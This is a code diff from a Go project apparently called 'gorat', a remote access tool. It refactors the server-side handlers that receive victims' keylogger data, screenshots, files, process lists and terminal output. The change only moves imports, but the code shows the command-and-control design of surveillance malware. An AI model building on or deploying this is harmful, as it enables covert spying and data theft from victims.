@@ -4,7 +4,7 @@ import (
 "log"
 "time"
 
-"gorat/common"
+"gorat/pkg/protocol"
 )
 
 // HeartbeatHandler handles heartbeat messages
@@ -18,18 +18,18 @@ func NewHeartbeatHandler(updater ClientMetadataUpdater) *HeartbeatHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *HeartbeatHandler) MessageType() common.MessageType {
-	return common.MsgTypeHeartbeat
+func (h *HeartbeatHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeHeartbeat
 }
 
 // Handle processes a heartbeat message
-func (h *HeartbeatHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var hb common.HeartbeatPayload
+func (h *HeartbeatHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var hb protocol.HeartbeatPayload
 	if err := msg.ParsePayload(&hb); err != nil {
 		return nil, err
 	}
 
-	h.updater.UpdateClientMetadata(clientID, func(m *common.ClientMetadata) {
+	h.updater.UpdateClientMetadata(clientID, func(m *protocol.ClientMetadata) {
 m.Status = hb.Status
 m.LastHeartbeat = time.Now()
 	})
@@ -48,13 +48,13 @@ func NewCommandResultHandler(store ResultStore) *CommandResultHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *CommandResultHandler) MessageType() common.MessageType {
-	return common.MsgTypeCommandResult
+func (h *CommandResultHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeCommandResult
 }
 
 // Handle processes a command result message
-func (h *CommandResultHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var cr common.CommandResultPayload
+func (h *CommandResultHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var cr protocol.CommandResultPayload
 	if err := msg.ParsePayload(&cr); err != nil {
 		log.Printf("Command result from %s: %s", clientID, string(msg.Payload))
 		return nil, err
@@ -76,13 +76,13 @@ func NewFileListHandler(store ResultStore) *FileListHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *FileListHandler) MessageType() common.MessageType {
-	return common.MsgTypeFileList
+func (h *FileListHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeFileList
 }
 
 // Handle processes a file list message
-func (h *FileListHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var fl common.FileListPayload
+func (h *FileListHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var fl protocol.FileListPayload
 	if err := msg.ParsePayload(&fl); err != nil {
 		log.Printf("File list from %s", clientID)
 		return nil, err
@@ -104,13 +104,13 @@ func NewDriveListHandler(store ResultStore) *DriveListHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *DriveListHandler) MessageType() common.MessageType {
-	return common.MsgTypeDriveList
+func (h *DriveListHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeDriveList
 }
 
 // Handle processes a drive list message
-func (h *DriveListHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var dl common.DriveListPayload
+func (h *DriveListHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var dl protocol.DriveListPayload
 	if err := msg.ParsePayload(&dl); err != nil {
 		log.Printf("Drive list from %s", clientID)
 		return nil, err
@@ -132,13 +132,13 @@ func NewProcessListHandler(store ResultStore) *ProcessListHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *ProcessListHandler) MessageType() common.MessageType {
-	return common.MsgTypeProcessList
+func (h *ProcessListHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeProcessList
 }
 
 // Handle processes a process list message
-func (h *ProcessListHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var pl common.ProcessListPayload
+func (h *ProcessListHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var pl protocol.ProcessListPayload
 	if err := msg.ParsePayload(&pl); err != nil {
 		log.Printf("Process list from %s", clientID)
 		return nil, err
@@ -160,13 +160,13 @@ func NewSystemInfoHandler(store ResultStore) *SystemInfoHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *SystemInfoHandler) MessageType() common.MessageType {
-	return common.MsgTypeSystemInfo
+func (h *SystemInfoHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeSystemInfo
 }
 
 // Handle processes a system info message
-func (h *SystemInfoHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var si common.SystemInfoPayload
+func (h *SystemInfoHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var si protocol.SystemInfoPayload
 	if err := msg.ParsePayload(&si); err != nil {
 		log.Printf("System info from %s", clientID)
 		return nil, err
@@ -188,13 +188,13 @@ func NewFileDataHandler(store ResultStore) *FileDataHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *FileDataHandler) MessageType() common.MessageType {
-	return common.MsgTypeFileData
+func (h *FileDataHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeFileData
 }
 
 // Handle processes a file data message
-func (h *FileDataHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var fd common.FileDataPayload
+func (h *FileDataHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var fd protocol.FileDataPayload
 	if err := msg.ParsePayload(&fd); err != nil {
 		log.Printf("File data from %s", clientID)
 		return nil, err
@@ -216,13 +216,13 @@ func NewScreenshotDataHandler(store ResultStore) *ScreenshotDataHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *ScreenshotDataHandler) MessageType() common.MessageType {
-	return common.MsgTypeScreenshotData
+func (h *ScreenshotDataHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeScreenshotData
 }
 
 // Handle processes a screenshot data message
-func (h *ScreenshotDataHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var sd common.ScreenshotDataPayload
+func (h *ScreenshotDataHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var sd protocol.ScreenshotDataPayload
 	if err := msg.ParsePayload(&sd); err != nil {
 		log.Printf("Screenshot received from %s", clientID)
 		return nil, err
@@ -242,13 +242,13 @@ func NewKeyloggerDataHandler() *KeyloggerDataHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *KeyloggerDataHandler) MessageType() common.MessageType {
-	return common.MsgTypeKeyloggerData
+func (h *KeyloggerDataHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeKeyloggerData
 }
 
 // Handle processes a keylogger data message
-func (h *KeyloggerDataHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var kld common.KeyloggerDataPayload
+func (h *KeyloggerDataHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var kld protocol.KeyloggerDataPayload
 	if err := msg.ParsePayload(&kld); err != nil {
 		return nil, err
 	}
@@ -266,13 +266,13 @@ func NewUpdateStatusHandler() *UpdateStatusHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *UpdateStatusHandler) MessageType() common.MessageType {
-	return common.MsgTypeUpdateStatus
+func (h *UpdateStatusHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeUpdateStatus
 }
 
 // Handle processes an update status message
-func (h *UpdateStatusHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var us common.UpdateStatusPayload
+func (h *UpdateStatusHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var us protocol.UpdateStatusPayload
 	if err := msg.ParsePayload(&us); err != nil {
 		return nil, err
 	}
@@ -292,13 +292,13 @@ func NewTerminalOutputHandler(terminalOutputFn func(sessionID string, data strin
 }
 
 // MessageType returns the message type this handler processes
-func (h *TerminalOutputHandler) MessageType() common.MessageType {
-	return common.MsgTypeTerminalOutput
+func (h *TerminalOutputHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypeTerminalOutput
 }
 
 // Handle processes a terminal output message
-func (h *TerminalOutputHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
-	var to common.TerminalOutputPayload
+func (h *TerminalOutputHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
+	var to protocol.TerminalOutputPayload
 	if err := msg.ParsePayload(&to); err != nil {
 		return nil, err
 	}
@@ -316,12 +316,12 @@ func NewPongHandler() *PongHandler {
 }
 
 // MessageType returns the message type this handler processes
-func (h *PongHandler) MessageType() common.MessageType {
-	return common.MsgTypePong
+func (h *PongHandler) MessageType() protocol.MessageType {
+	return protocol.MsgTypePong
 }
 
 // Handle processes a pong message
-func (h *PongHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
+func (h *PongHandler) Handle(clientID string, msg *protocol.Message) (interface{}, error) {
 	// Pong is just a heartbeat response, no action needed
 	return nil, nil
 }
